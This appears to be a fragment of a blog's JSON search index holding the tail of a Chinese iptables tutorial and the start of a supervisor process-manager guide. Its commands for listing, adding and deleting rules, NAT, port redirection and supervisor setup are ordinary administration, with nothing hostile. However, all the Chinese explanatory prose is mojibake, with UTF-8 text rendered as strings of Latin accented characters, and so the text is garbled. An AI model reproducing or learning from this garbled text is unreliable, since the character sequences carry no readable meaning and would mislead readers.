æŸ¥çœ‹æŒ‡å®šè¡¨çš„æ‰€æœ‰è§„åˆ™ï¼Œå¹¶ä¸”æ˜¾ç¤ºæ›´è¯¦ç»†çš„ä¿¡æ¯ï¼ˆæ›´å¤šå­—æ®µï¼‰ï¼Œ-vè¡¨ç¤ºverboseï¼Œè¡¨ç¤ºè¯¦ç»†çš„ï¼Œå†—é•¿çš„ï¼Œå½“ä½¿ç”¨-vé€‰é¡¹æ—¶ï¼Œä¼šæ˜¾ç¤ºå‡º\"è®¡æ•°å™¨\"çš„ä¿¡æ¯ï¼Œç”±äºä¸Šä¾‹ä¸­ä½¿ç”¨çš„é€‰é¡¹éƒ½æ˜¯çŸ­é€‰é¡¹ï¼Œæ‰€ä»¥ä¸€èˆ¬ç®€å†™ä¸ºiptables -t è¡¨å -vL\niptablesÂ -tÂ è¡¨åÂ -vÂ -L\n\n\n\n#è¡¨ç¤ºæŸ¥çœ‹è¡¨çš„æ‰€æœ‰è§„åˆ™ï¼Œå¹¶ä¸”åœ¨æ˜¾ç¤ºè§„åˆ™æ—¶ï¼Œä¸å¯¹è§„åˆ™ä¸­çš„IPæˆ–è€…ç«¯å£è¿›è¡Œåç§°åè§£ï¼Œ-né€‰é¡¹è¡¨ç¤ºä¸è§£æIPåœ°å€ã€‚\niptablesÂ -tÂ è¡¨åÂ -nÂ -L\n\n\n#è¡¨ç¤ºæŸ¥çœ‹è¡¨çš„æ‰€æœ‰è§„åˆ™ï¼Œå¹¶ä¸”æ˜¾ç¤ºè§„åˆ™çš„åºå·ï¼Œ--line-numbersé€‰é¡¹è¡¨ç¤ºæ˜¾ç¤ºè§„åˆ™çš„åºå·ï¼Œæ³¨æ„ï¼Œæ­¤é€‰é¡¹ä¸ºé•¿é€‰é¡¹ï¼Œä¸èƒ½ä¸å…¶ä»–çŸ­é€‰é¡¹åˆå¹¶ï¼Œä¸è¿‡æ­¤é€‰é¡¹å¯ä»¥ç®€å†™ä¸º--lineï¼Œæ³¨æ„ï¼Œç®€å†™åä»ç„¶æ˜¯ä¸¤æ¡æ¨ªæ ï¼Œä»ç„¶æ˜¯é•¿é€‰é¡¹ã€‚\niptablesÂ --line-numbersÂ -tÂ è¡¨åÂ -L\n\n\n#è¡¨ç¤ºæŸ¥çœ‹è¡¨ä¸­çš„æ‰€æœ‰è§„åˆ™ï¼Œå¹¶ä¸”æ˜¾ç¤ºæ›´è¯¦ç»†çš„ä¿¡æ¯(-vé€‰é¡¹)ï¼Œä¸è¿‡ï¼Œè®¡æ•°å™¨ä¸­çš„ä¿¡æ¯æ˜¾ç¤ºä¸ºç²¾ç¡®çš„è®¡æ•°å€¼ï¼Œè€Œä¸æ˜¯æ˜¾ç¤ºä¸ºç»è¿‡å¯è¯»ä¼˜åŒ–çš„è®¡æ•°å€¼ï¼Œ-xé€‰é¡¹è¡¨ç¤ºæ˜¾ç¤ºè®¡æ•°å™¨çš„ç²¾ç¡®å€¼ã€‚\niptablesÂ -tÂ è¡¨åÂ -vÂ -xÂ -L\n\n\n# å®é™…ä½¿ç”¨ä¸­ï¼Œä¸ºäº†æ–¹ä¾¿ï¼Œå¾€å¾€ä¼šå°†çŸ­é€‰é¡¹è¿›è¡Œåˆå¹¶ï¼Œæ‰€ä»¥ï¼Œå¦‚æœå°†ä¸Šè¿°é€‰é¡¹éƒ½ç³…åˆåœ¨ä¸€èµ·ï¼Œå¯ä»¥å†™æˆå¦‚ä¸‹å‘½ä»¤ï¼Œæ­¤å¤„ä»¥filterè¡¨ä¸ºä¾‹ã€‚\niptablesÂ --lineÂ -tÂ filterÂ -nvxLÂ INPUT\n```\n\n\n\n### 11.2 è¿‡æ»¤å¢åˆ å­˜\n\n+ å¢åŠ \n\n```bash\n#åœ¨æŒ‡å®šè¡¨çš„æŒ‡å®šé“¾çš„å°¾éƒ¨æ·»åŠ ä¸€æ¡è§„åˆ™ï¼Œ-Aé€‰é¡¹è¡¨ç¤ºåœ¨å¯¹åº”é“¾çš„æœ«å°¾æ·»åŠ è§„åˆ™ï¼Œçœç•¥-té€‰é¡¹æ—¶ï¼Œè¡¨ç¤ºé»˜è®¤æ“ä½œfilterè¡¨ä¸­çš„è§„åˆ™\nå‘½ä»¤è¯­æ³•ï¼šiptablesÂ -tÂ è¡¨åÂ -AÂ é“¾åÂ åŒ¹é…æ¡ä»¶Â -jÂ åŠ¨ä½œ\nç¤ºä¾‹ï¼šiptablesÂ -tÂ filterÂ -AÂ INPUTÂ -sÂ 192.168.1.146Â -jÂ DROP\n\n\n#åœ¨æŒ‡å®šè¡¨çš„æŒ‡å®šé“¾çš„é¦–éƒ¨æ·»åŠ ä¸€æ¡è§„åˆ™ï¼Œ-Ié€‰å‹è¡¨ç¤ºåœ¨å¯¹åº”é“¾çš„å¼€å¤´æ·»åŠ è§„åˆ™\nå‘½ä»¤è¯­æ³•ï¼šiptablesÂ -tÂ è¡¨åÂ -IÂ é“¾åÂ åŒ¹é…æ¡ä»¶Â -jÂ åŠ¨ä½œ\nç¤ºä¾‹ï¼šiptablesÂ -tÂ filterÂ -IÂ INPUTÂ -sÂ 192.168.1.146Â -jÂ ACCEPT\n\n\n#åœ¨æŒ‡å®šè¡¨çš„æŒ‡å®šé“¾çš„æŒ‡å®šä½ç½®æ·»åŠ ä¸€æ¡è§„åˆ™\nå‘½ä»¤è¯­æ³•ï¼šiptablesÂ -tÂ è¡¨åÂ -IÂ é“¾åÂ è§„åˆ™åºå·Â åŒ¹é…æ¡ä»¶Â -jÂ åŠ¨ä½œ\nç¤ºä¾‹ï¼šiptablesÂ -tÂ filterÂ -IÂ INPUTÂ 5Â -sÂ 192.168.1.146Â -jÂ REJECT\n\n\n#è®¾ç½®æŒ‡å®šè¡¨çš„æŒ‡å®šé“¾çš„é»˜è®¤ç­–ç•¥ï¼ˆé»˜è®¤åŠ¨ä½œï¼‰ï¼Œå¹¶éæ·»åŠ è§„åˆ™ã€‚\nå‘½ä»¤è¯­æ³•ï¼šiptablesÂ -tÂ è¡¨åÂ -PÂ é“¾åÂ åŠ¨ä½œ\nç¤ºä¾‹ï¼šiptablesÂ -tÂ filterÂ -PÂ FORWARDÂ ACCEPT\n```\n\n+ åˆ é™¤\n\n```bash\n#æŒ‰ç…§è§„åˆ™åºå·åˆ é™¤è§„åˆ™ï¼Œåˆ é™¤æŒ‡å®šè¡¨çš„æŒ‡å®šé“¾çš„æŒ‡å®šè§„åˆ™ï¼Œ-Dé€‰é¡¹è¡¨ç¤ºåˆ é™¤å¯¹åº”é“¾ä¸­çš„è§„åˆ™ã€‚\nå‘½ä»¤è¯­æ³•ï¼šiptablesÂ -tÂ è¡¨åÂ -DÂ é“¾åÂ è§„åˆ™åºå·\nç¤ºä¾‹ï¼šiptablesÂ -tÂ filterÂ -DÂ INPUTÂ 3\n\n\n#æŒ‰ç…§å…·ä½“çš„åŒ¹é…æ¡ä»¶ä¸åŠ¨ä½œåˆ é™¤è§„åˆ™ï¼Œåˆ é™¤æŒ‡å®šè¡¨çš„æŒ‡å®šé“¾çš„æŒ‡å®šè§„åˆ™ã€‚\nå‘½ä»¤è¯­æ³•ï¼šiptablesÂ -tÂ è¡¨åÂ -DÂ é“¾åÂ åŒ¹é…æ¡ä»¶Â -jÂ åŠ¨ä½œ\nç¤ºä¾‹ï¼šiptablesÂ -tÂ filterÂ -DÂ INPUTÂ -sÂ 192.168.1.146Â -jÂ DROP\n\n\n#åˆ é™¤æŒ‡å®šè¡¨çš„æŒ‡å®šé“¾ä¸­çš„æ‰€æœ‰è§„åˆ™ï¼Œ-Fé€‰é¡¹è¡¨ç¤ºæ¸…ç©ºå¯¹åº”é“¾ä¸­çš„è§„åˆ™ï¼Œæ‰§è¡Œæ—¶éœ€ä¸‰æ€ã€‚\nå‘½ä»¤è¯­æ³•ï¼šiptablesÂ -tÂ è¡¨åÂ -FÂ é“¾å\nç¤ºä¾‹ï¼šiptablesÂ -tÂ filterÂ -FÂ INPUT\n\n#åˆ é™¤æŒ‡å®šè¡¨ä¸­çš„æ‰€æœ‰è§„åˆ™ï¼Œæ‰§è¡Œæ—¶éœ€ä¸‰æ€ã€‚\nå‘½ä»¤è¯­æ³•ï¼šiptablesÂ -tÂ è¡¨åÂ -F\nç¤ºä¾‹ï¼šiptablesÂ -tÂ filterÂ -F\n```\n\n+ ä¿®æ”¹\n\n```bash\n#ä¿®æ”¹æŒ‡å®šè¡¨ä¸­æŒ‡å®šé“¾çš„æŒ‡å®šè§„åˆ™ï¼Œ-Ré€‰é¡¹è¡¨ç¤ºä¿®æ”¹å¯¹åº”é“¾ä¸­çš„è§„åˆ™ï¼Œä½¿ç”¨-Ré€‰é¡¹æ—¶è¦åŒæ—¶æŒ‡å®šå¯¹åº”çš„é“¾ä»¥åŠè§„åˆ™å¯¹åº”çš„åºå·ï¼Œå¹¶ä¸”è§„åˆ™ä¸­åŸæœ¬çš„åŒ¹é…æ¡ä»¶ä¸å¯çœç•¥ã€‚\nå‘½ä»¤è¯­æ³•ï¼šiptablesÂ -tÂ è¡¨åÂ -RÂ é“¾åÂ è§„åˆ™åºå·Â è§„åˆ™åŸæœ¬çš„åŒ¹é…æ¡ä»¶Â -jÂ åŠ¨ä½œ\nç¤ºä¾‹ï¼šiptablesÂ -tÂ filterÂ -RÂ INPUTÂ 3Â -sÂ 192.168.1.146Â -jÂ ACCEPT\n\n\n#å…¶ä»–ä¿®æ”¹è§„åˆ™çš„æ–¹æ³•ï¼šå…ˆé€šè¿‡ç¼–å·åˆ é™¤è§„åˆ™ï¼Œå†åœ¨åŸç¼–å·ä½ç½®æ·»åŠ ä¸€æ¡è§„åˆ™ã€‚\n\n\n#ä¿®æ”¹æŒ‡å®šè¡¨çš„æŒ‡å®šé“¾çš„é»˜è®¤ç­–ç•¥ï¼ˆé»˜è®¤åŠ¨ä½œï¼‰ï¼Œå¹¶éä¿®æ”¹è§„åˆ™ï¼Œå¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ã€‚\nå‘½ä»¤è¯­æ³•ï¼šiptablesÂ -tÂ è¡¨åÂ -PÂ é“¾åÂ åŠ¨ä½œ\nç¤ºä¾‹ï¼šiptablesÂ -tÂ filterÂ -PÂ FORWARDÂ ACCEPT\n```\n+ ä¿å­˜\n\n```bash\n# centos\nyum install -y iptables-services\nsystemctl disable firewalld\nsystemctl enable iptables\nservice iptables save\n\n# ubtuntu\nsudo apt-get install iptables-persistent\nsudo netfilter-persistent save\nsudo netfilter-persistent reload\n```\n\n\n\n### 11.3 åè®®, ç½‘å¡åŒ¹é…\n\n-pç”¨äºåŒ¹é…æŠ¥æ–‡çš„åè®®ç±»å‹,å¯ä»¥åŒ¹é…çš„åè®®ç±»å‹tcpã€udpã€udpliteã€icmpã€espã€ahã€sctpç­‰ï¼ˆcentos7ä¸­è¿˜æ”¯æŒicmpv6ã€mhï¼‰ã€‚\n\n```Â bash\niptablesÂ -tÂ filterÂ -IÂ INPUTÂ -pÂ tcpÂ -sÂ 192.168.1.146Â -jÂ ACCEPT\niptablesÂ -tÂ filterÂ -IÂ INPUTÂ !Â -pÂ udpÂ -sÂ 192.168.1.146Â -jÂ ACCEPT\n```\n\n\n\n-iç”¨äºåŒ¹é…æŠ¥æ–‡æ˜¯ä»å“ªä¸ªç½‘å¡æ¥å£æµå…¥æœ¬æœºçš„ï¼Œç”±äºåŒ¹é…æ¡ä»¶åªæ˜¯ç”¨äºåŒ¹é…æŠ¥æ–‡æµå…¥çš„ç½‘å¡ï¼Œæ‰€ä»¥åœ¨OUTPUTé“¾ä¸POSTROUTINGé“¾ä¸­ä¸èƒ½ä½¿ç”¨æ­¤é€‰é¡¹ã€‚\n\n```bash\niptablesÂ -tÂ filterÂ -IÂ INPUTÂ -pÂ icmpÂ -iÂ eth4Â -jÂ DROP\niptablesÂ -tÂ filterÂ -IÂ INPUTÂ -pÂ icmpÂ !Â -iÂ eth4Â -jÂ DROP\n```\n\n-oç”¨äºåŒ¹é…æŠ¥æ–‡å°†è¦ä»å“ªä¸ªç½‘å¡æ¥å£æµå‡ºæœ¬æœºï¼ŒäºåŒ¹é…æ¡ä»¶åªæ˜¯ç”¨äºåŒ¹é…æŠ¥æ–‡æµå‡ºçš„ç½‘å¡ï¼Œæ‰€ä»¥åœ¨INPUTé“¾ä¸PREROUTINGé“¾ä¸­ä¸èƒ½ä½¿ç”¨æ­¤é€‰é¡¹ã€‚\n\n```bash\niptablesÂ -tÂ filterÂ -IÂ OUTPUTÂ -pÂ icmpÂ -oÂ eth4Â -jÂ DROP\niptablesÂ -tÂ filterÂ -IÂ OUTPUTÂ -pÂ icmpÂ !Â -oÂ eth4Â -jÂ DROP\n```\n\n\n\n### 11.4 IPåŒ¹é…\n\n-sç”¨äºåŒ¹é…æŠ¥æ–‡çš„æºåœ°å€,å¯ä»¥åŒæ—¶æŒ‡å®šå¤šä¸ªæºåœ°å€ï¼Œæ¯ä¸ªIPä¹‹é—´ç”¨é€—å·éš”å¼€ï¼Œä¹Ÿå¯ä»¥æŒ‡å®šä¸ºä¸€ä¸ªç½‘æ®µã€‚\n\n```bash\niptables -t filter -I INPUT -s 192.168.1.111,192.168.1.118 -j DROP\niptables -t filter -I INPUT -s 192.168.1.0/24 -j ACCEPT\niptables -t filter -I INPUT ! -s 192.168.1.0/24 -j ACCEPT\n```\n\n-dç”¨äºåŒ¹é…æŠ¥æ–‡çš„ç›®æ ‡åœ°å€,å¯ä»¥åŒæ—¶æŒ‡å®šå¤šä¸ªç›®æ ‡åœ°å€ï¼Œæ¯ä¸ªIPä¹‹é—´ç”¨é€—å·éš”å¼€ï¼Œä¹Ÿå¯ä»¥æŒ‡å®šä¸ºä¸€ä¸ªç½‘æ®µã€‚\n\n```bash\niptablesÂ -tÂ filterÂ -IÂ OUTPUTÂ -dÂ 192.168.1.111,192.168.1.118Â -jÂ DROP\niptablesÂ -tÂ filterÂ -IÂ INPUTÂ -dÂ 192.168.1.0/24Â -jÂ ACCEPT\niptablesÂ -tÂ filterÂ -IÂ INPUTÂ !Â -dÂ 192.168.1.0/24Â -jÂ ACCEPT\n```\n\n\n\n### 11.5 ç«¯å£åŒ¹é…\n\n+ tcpæ‰©å±•æ¨¡å—\n\n  -p tcp -m tcp --sport ç”¨äºåŒ¹é…tcpåè®®æŠ¥æ–‡çš„æºç«¯å£ï¼Œå¯ä»¥ä½¿ç”¨å†’å·æŒ‡å®šä¸€ä¸ªè¿ç»­çš„ç«¯å£èŒƒå›´\n\n  -p tcp -m tcp --dport ç”¨äºåŒ¹é…tcpåè®®æŠ¥æ–‡çš„ç›®æ ‡ç«¯å£ï¼Œå¯ä»¥ä½¿ç”¨å†’å·æŒ‡å®šä¸€ä¸ªè¿ç»­çš„ç«¯å£èŒƒå›´\n\n  ```bash\n  iptablesÂ -tÂ filterÂ -IÂ OUTPUTÂ -dÂ 192.168.1.146Â -pÂ tcpÂ -mÂ tcpÂ --sportÂ 22Â -jÂ REJECT\n  iptablesÂ -tÂ filterÂ -IÂ INPUTÂ -sÂ 192.168.1.146Â -pÂ tcpÂ -mÂ tcpÂ --dportÂ 22:25Â -jÂ REJECT\n  iptablesÂ -tÂ filterÂ -IÂ INPUTÂ -sÂ 192.168.1.146Â -pÂ tcpÂ -mÂ tcpÂ --dportÂ :22Â -jÂ REJECT\n  iptablesÂ -tÂ filterÂ -IÂ INPUTÂ -sÂ 192.168.1.146Â -pÂ tcpÂ -mÂ tcpÂ --dportÂ 80:Â -jÂ REJECT\n  iptablesÂ -tÂ filterÂ -IÂ OUTPUTÂ -dÂ 192.168.1.146Â -pÂ tcpÂ -mÂ tcpÂ !Â --sportÂ 22Â -jÂ ACCEPT\n  ```\n\n  \n\n+ multiportæ‰©å±•æ¨¡å—\n\n  -p tcp -m multiport --sports ç”¨äºåŒ¹é…æŠ¥æ–‡çš„æºç«¯å£ï¼Œå¯ä»¥æŒ‡å®šç¦»æ•£çš„å¤šä¸ªç«¯å£å·,ç«¯å£ä¹‹é—´ç”¨\"é€—å·\"éš”å¼€\n\n  -p udp -m multiport --dports ç”¨äºåŒ¹é…æŠ¥æ–‡çš„ç›®æ ‡ç«¯å£ï¼Œå¯ä»¥æŒ‡å®šç¦»æ•£çš„å¤šä¸ªç«¯å£å·ï¼Œç«¯å£ä¹‹é—´ç”¨\"é€—å·\"éš”å¼€\n\n  ```bash\niptablesÂ -tÂ filterÂ -IÂ OUTPUTÂ -dÂ 192.168.1.146Â -pÂ udpÂ -mÂ multiportÂ --sportsÂ 137,138Â -jÂ REJECT\n  iptablesÂ -tÂ filterÂ -IÂ INPUTÂ -sÂ 192.168.1.146Â -pÂ tcpÂ -mÂ multiportÂ --dportsÂ 22,80Â -jÂ REJECT\n  iptablesÂ -tÂ filterÂ -IÂ INPUTÂ -sÂ 192.168.1.146Â -pÂ tcpÂ -mÂ multiportÂ !Â --dportsÂ 22,80Â -jÂ REJECT\n  iptablesÂ -tÂ filterÂ -IÂ INPUTÂ -sÂ 192.168.1.146Â -pÂ tcpÂ -mÂ multiportÂ --dportsÂ 80:88Â -jÂ REJECT\n  iptablesÂ -tÂ filterÂ -IÂ INPUTÂ -sÂ 192.168.1.146Â -pÂ tcpÂ -mÂ multiportÂ --dportsÂ 22,80:88Â -jÂ REJECT\n  ```\n  \n  \n\n### 11.6 tcpå¤´æ ‡å¿—ä½åŒ¹é…\n\n```bash\n#ç¬¬ä¸€æ¬¡æ¡æ‰‹\niptablesÂ -tÂ filterÂ -IÂ INPUTÂ -pÂ tcpÂ -mÂ tcpÂ --dportÂ 22Â --tcp-flagsÂ SYN,ACK,FIN,RST,URG,PSHÂ SYNÂ -jÂ REJECT\n#ç¬¬äºŒæ¬¡æ¡æ‰‹\niptablesÂ -tÂ filterÂ -IÂ OUTPUTÂ -pÂ tcpÂ -mÂ tcpÂ --sportÂ 22Â --tcp-flagsÂ SYN,ACK,FIN,RST,URG,PSHÂ SYN,ACKÂ -jÂ REJECT\n#ç¬¬ä¸€æ¬¡æ¡æ‰‹\niptablesÂ -tÂ filterÂ -IÂ INPUTÂ -pÂ tcpÂ -mÂ tcpÂ --dportÂ 22Â --tcp-flagsÂ ALLÂ SYNÂ -jÂ REJECT\n#ç¬¬äºŒæ¬¡æ¡æ‰‹\niptablesÂ -tÂ filterÂ -IÂ OUTPUTÂ -pÂ tcpÂ -mÂ tcpÂ --sportÂ 22Â --tcp-flagsÂ ALLÂ SYN,ACKÂ -jÂ REJECT\n\n#ç”¨äºåŒ¹é…tcpæ–°å»ºè¿æ¥çš„è¯·æ±‚æŠ¥æ–‡,\"ç¬¬ä¸€æ¬¡æ¡æ‰‹\"\niptablesÂ -tÂ filterÂ -IÂ INPUTÂ -pÂ tcpÂ -mÂ tcpÂ --dportÂ 22Â --synÂ -jÂ REJECT\n```\n\n\n\n### 11.7 ç½‘ç»œé˜²ç«å¢™(filterè¡¨forwardé“¾)\n\nç”±äºiptablesæ­¤æ—¶çš„è§’è‰²ä¸º\"ç½‘ç»œé˜²ç«å¢™\"ï¼Œæ‰€ä»¥éœ€è¦åœ¨filterè¡¨ä¸­çš„FORWARDé“¾ä¸­è®¾ç½®è§„åˆ™ã€‚\nå¯ä»¥ä½¿ç”¨\"ç™½åå•æœºåˆ¶\"ï¼Œå…ˆæ·»åŠ ä¸€æ¡é»˜è®¤æ‹’ç»çš„è§„åˆ™ï¼Œç„¶åå†ä¸ºéœ€è¦æ”¾è¡Œçš„æŠ¥æ–‡è®¾ç½®è§„åˆ™ã€‚\né…ç½®è§„åˆ™æ—¶éœ€è¦è€ƒè™‘\"æ–¹å‘é—®é¢˜\"ï¼Œé’ˆå¯¹è¯·æ±‚æŠ¥æ–‡ä¸å›åº”æŠ¥æ–‡ï¼Œè€ƒè™‘æŠ¥æ–‡çš„æºåœ°å€ä¸ç›®æ ‡åœ°å€ï¼Œæºç«¯å£ä¸ç›®æ ‡ç«¯å£ç­‰ã€‚\n\n```bash\n#ç¤ºä¾‹ä¸ºå…è®¸ç½‘ç»œå†…ä¸»æœºè®¿é—®ç½‘ç»œå¤–ä¸»æœºçš„webæœåŠ¡ä¸sshdæœåŠ¡ã€‚\niptablesÂ -AÂ FORWARDÂ -jÂ REJECT\niptablesÂ -IÂ FORWARDÂ -sÂ 10.1.0.0/16Â -pÂ tcpÂ --dportÂ 80Â -jÂ ACCEPT\niptablesÂ -IÂ FORWARDÂ -dÂ 10.1.0.0/16Â -pÂ tcpÂ --sportÂ 80Â -jÂ ACCEPT\niptablesÂ -IÂ FORWARDÂ -sÂ 10.1.0.0/16Â -pÂ tcpÂ --dportÂ 22Â -jÂ ACCEPT\niptablesÂ -IÂ FORWARDÂ -dÂ 10.1.0.0/16Â -pÂ tcpÂ --sportÂ 22Â -jÂ ACCEPT\n```\n\n\n\nå¯ä»¥ä½¿ç”¨stateæ‰©å±•æ¨¡å—ï¼Œå¯¹ä¸Šè¿°è§„åˆ™è¿›è¡Œä¼˜åŒ–ï¼Œä½¿ç”¨å¦‚ä¸‹é…ç½®å¯ä»¥çœç•¥è®¸å¤š\"å›åº”æŠ¥æ–‡æ”¾è¡Œè§„åˆ™\"ã€‚\n\n```bash\niptablesÂ -AÂ FORWARDÂ -jÂ REJECT\niptablesÂ -IÂ FORWARDÂ -sÂ 10.1.0.0/16Â -pÂ tcpÂ --dportÂ 80Â -jÂ ACCEPT\niptablesÂ -IÂ FORWARDÂ -sÂ 10.1.0.0/16Â -pÂ tcpÂ --dportÂ 22Â -jÂ ACCEPT\niptablesÂ -IÂ FORWARDÂ -mÂ stateÂ --stateÂ ESTABLISHED,RELATEDÂ -jÂ ACCEPT\n```\n\n\n\n### 11.8 SNATå†…ç½‘å¤–å‡º(natè¡¨postroutingé“¾)\n\n```bash\niptablesÂ -tÂ natÂ -AÂ POSTROUTINGÂ -sÂ 10.1.0.0/16Â -jÂ SNATÂ --to-sourceÂ å…¬ç½‘IP\niptablesÂ -tÂ natÂ -AÂ POSTROUTINGÂ -sÂ 10.1.0.0/16Â -oÂ eth0Â -jÂ MASQUERADE\n```\n\n\n\n### 11.9 DNATå¤–ç½‘è¿›æ¥(natè¡¨preroutingé“¾)\n\n```bash\niptablesÂ -tÂ natÂ -IÂ PREROUTINGÂ -dÂ å…¬ç½‘IPÂ -pÂ tcpÂ --dportÂ å…¬ç½‘ç«¯å£Â -jÂ DNATÂ --to-destinationÂ ç§ç½‘IP:ç«¯å£å·\niptablesÂ -tÂ natÂ -IÂ PREROUTINGÂ -dÂ å…¬ç½‘IPÂ -pÂ tcpÂ --dportÂ 8080Â -jÂ DNATÂ --to-destinationÂ 10.1.0.1:80\n\n# ä½†æ˜¯åœ¨æµ‹è¯•DNATæ—¶ï¼Œå¯¹åº”SNATè§„åˆ™ä¹Ÿéœ€è¦é…ç½®ï¼Œæ‰èƒ½æ­£å¸¸DNATï¼Œå¯ä»¥å…ˆå°è¯•åªé…ç½®DNATè§„åˆ™ï¼Œå¦‚æœæ— æ³•æ­£å¸¸DNATï¼Œå†å°è¯•æ·»åŠ å¯¹åº”çš„SNATè§„åˆ™ï¼ŒSNATè§„åˆ™é…ç½®ä¸€æ¡å³å¯ï¼ŒDNATè§„åˆ™éœ€è¦æ ¹æ®å®é™…æƒ…å†µé…ç½®ä¸åŒçš„DNATè§„åˆ™ã€‚\niptablesÂ -tÂ natÂ -AÂ POSTROUTINGÂ -sÂ 10.1.0.0/16Â -jÂ SNATÂ --to-sourceÂ å…¬ç½‘IP\n```\n\n\n\n### 11.10 æœ¬æœºç›®æ ‡ç«¯å£æ˜ å°„\n\n```bash\niptablesÂ -tÂ natÂ -AÂ PREROUTINGÂ -pÂ tcpÂ --dportÂ 80Â -jÂ REDIRECTÂ --to-portsÂ 8080\n```\n\né…ç½®å®Œæˆä¸Šè¿°è§„åˆ™åï¼Œå…¶ä»–æœºå™¨è®¿é—®æœ¬æœºçš„80ç«¯å£æ—¶ï¼Œä¼šè¢«æ˜ å°„åˆ°8080ç«¯å£ã€‚\n\n\n\n# 12. å‚è€ƒèµ„æ–™\n\n+ http://www.zsythink.net/archives/tag/iptables/\n+ https://support-it.huawei.com/docs/zh-cn/hcs-6.5.0/vfw-type1/vfw_ug_000031.html\n+ https://zhuanlan.zhihu.com/p/86734727\n","tags":["iptables"],"categories":["ç³»ç»Ÿ"]},{"title":"supervisorè¿›ç¨‹ç®¡ç†ä½¿ç”¨","url":"%2Fp%2F1825ecdb.html","content":"\nsupervisoræ˜¯ä¸€ä¸ªC/Sç³»ç»Ÿ,å®ƒå¯ä»¥åœ¨ç±»UNIXç³»ç»Ÿä¸Šæ§åˆ¶ç³»ç»Ÿè¿›ç¨‹ï¼Œç”±pythonç¼–å†™ï¼Œæä¾›äº†å¤§é‡çš„åŠŸèƒ½æ¥å®ç°å¯¹è¿›ç¨‹çš„ç®¡ç†ã€‚\n\n<!-- more -->\n\n# 1. supervisor ä»‹ç»\n\nsupervisorä¸»è¦åŒ…å«ä»¥ä¸‹å››ä¸ªéƒ¨åˆ†ï¼š\n\n+ supervisordï¼š\n\n  è¿™ä¸ªæ˜¯supervisoræœåŠ¡çš„ä¸»è¦ç®¡ç†å™¨ï¼Œè´Ÿè´£ç®¡ç†æˆ‘ä»¬é…ç½®çš„å­è¿›ç¨‹ï¼ŒåŒ…æ‹¬é‡å¯å´©æºƒæˆ–å¼‚å¸¸é€€å‡ºçš„å­è¿›ç¨‹ï¼ŒåŒæ—¶ä¹Ÿå“åº”æ¥è‡ªå®¢æˆ·ç«¯çš„è¯·æ±‚ã€‚\n\n+ supervisorctlï¼š\n\n  supervisordæœåŠ¡çš„å®¢æˆ·ç«¯å‘½ä»¤è¡Œã€‚å¬è¿‡è¿™ä¸ªï¼Œæˆ‘ä»¬å¯ä»¥è·å¾—ç”±ä¸»è¿›ç¨‹æ§åˆ¶çš„å­è¿›ç¨‹çš„çŠ¶æ€ï¼Œåœæ­¢å’Œå¯åŠ¨å­è¿›ç¨‹ï¼Œå¹¶è·å¾—ä¸»è¿›ç¨‹çš„è¿è¡Œåˆ—è¡¨ã€‚\n\n+ Web Serverï¼š\n\n  supervisorctlåŠŸèƒ½å¨‰ç¾ã€‚è¿™ä¸ªæ˜¯é€šè¿‡webç•Œé¢æŸ¥çœ‹å’Œæ§åˆ¶è¿›ç¨‹çŠ¶æ€ã€‚\n\n+ XML-RPC Interfaceï¼š\n\n  æœåŠ¡äºweb UIçš„åŒä¸€ä¸ªHTTPæœåŠ¡å™¨æä¾›ä¸€ä¸ªXML-RPCæ¥å£ï¼Œå¯ä»¥ç”¨æ¥è¯¢é—®å’Œæ§åˆ¶ç®¡ç†ç¨‹åºåŠå…¶è¿è¡Œçš„ç¨‹åº\n\n\n\n# 2. supervisorå®‰è£…\n\n```bash\n# å®‰è£…\nsudo pip install supervisor\n\n# å¯åŠ¨æœåŠ¡\nsupervisord -c /etc/supervisord.conf\n\n# æŸ¥çœ‹æ˜¯å¦å¯åŠ¨\nps -ef | grep supervisord\n```\n\n\n\n# 3. supervisoré…ç½®\n\nsupervisor æ˜¯ä¸€ä¸ª C/S æ¨¡å‹çš„ç¨‹åºï¼Œsupervisordæ˜¯ server ç«¯ï¼Œå¯¹åº”çš„ client ç«¯ï¼šsupervisorctl\n\n### 3.1 é»˜è®¤é…ç½®\n\nè¿è¡Œ`echo_supervisord_conf` å‘½ä»¤è¾“å‡ºé»˜è®¤çš„é…ç½®é¡¹, é»˜è®¤ supervisor ä¼šä½¿ç”¨ /etc/supervisord.conf ä½œä¸ºé»˜è®¤é…ç½®æ–‡ä»¶ã€‚\n\næ–‡ä»¶å†…å¯ä»¥çœ‹åˆ°å¦‚ä¸‹é…ç½®, æ‰€ä»¥è‡ªå®šä¹‰çš„é…ç½®æ–‡ä»¶å¯ä»¥æ”¾åˆ°`/etc/supervisor/conf.d/`æ–‡ä»¶å¤¹ä¸‹.\n\n```ini\n[include]\nfiles = /etc/supervisor/conf.d/*.conf\n```\n\n\n\n### 3.2 åº”ç”¨ç¨‹åºé…ç½®\n\n```ini\n[program:usercenter]  # usercenter æ˜¯åº”ç”¨ç¨‹åºçš„å”¯ä¸€æ ‡è¯†ï¼Œä¸èƒ½é‡å¤ã€‚å¯¹è¯¥ç¨‹åºçš„æ‰€æœ‰æ“ä½œï¼ˆstart, restart ç­‰ï¼‰éƒ½é€šè¿‡åå­—æ¥å®ç°ã€‚\ndirectory = /home/leon/projects/usercenter ; ç¨‹åºçš„å¯åŠ¨ç›®å½•\ncommand = gunicorn -w 8 -b 0.0.0.0:17510 wsgi:app  ; å¯åŠ¨å‘½ä»¤\nautostart = true     ; åœ¨ supervisord å¯åŠ¨çš„æ—¶å€™ä¹Ÿè‡ªåŠ¨å¯åŠ¨\nstartsecs = 5        ; å¯åŠ¨ 5 ç§’åæ²¡æœ‰å¼‚å¸¸é€€å‡ºï¼Œå°±å½“ä½œå·²ç»æ­£å¸¸å¯åŠ¨äº†\nautorestart = true   ; ç¨‹åºå¼‚å¸¸é€€å‡ºåè‡ªåŠ¨é‡å¯\nstartretries = 3     ; å¯åŠ¨å¤±è´¥è‡ªåŠ¨é‡è¯•æ¬¡æ•°ï¼Œé»˜è®¤æ˜¯ 3\nuser = leon          ; ç”¨å“ªä¸ªç”¨æˆ·å¯åŠ¨\nredirect_stderr = true  ; æŠŠ stderr é‡å®šå‘åˆ° stdoutï¼Œé»˜è®¤ false\nstdout_logfile_maxbytes = 20MB  ; stdout æ—¥å¿—æ–‡ä»¶å¤§å°ï¼Œé»˜è®¤ 50MB\nstdout_logfile_backups = 20     ; stdout æ—¥å¿—æ–‡ä»¶å¤‡ä»½æ•°, éœ€è¦æ³¨æ„å½“æŒ‡å®šç›®å½•ä¸å­˜åœ¨æ—¶æ— 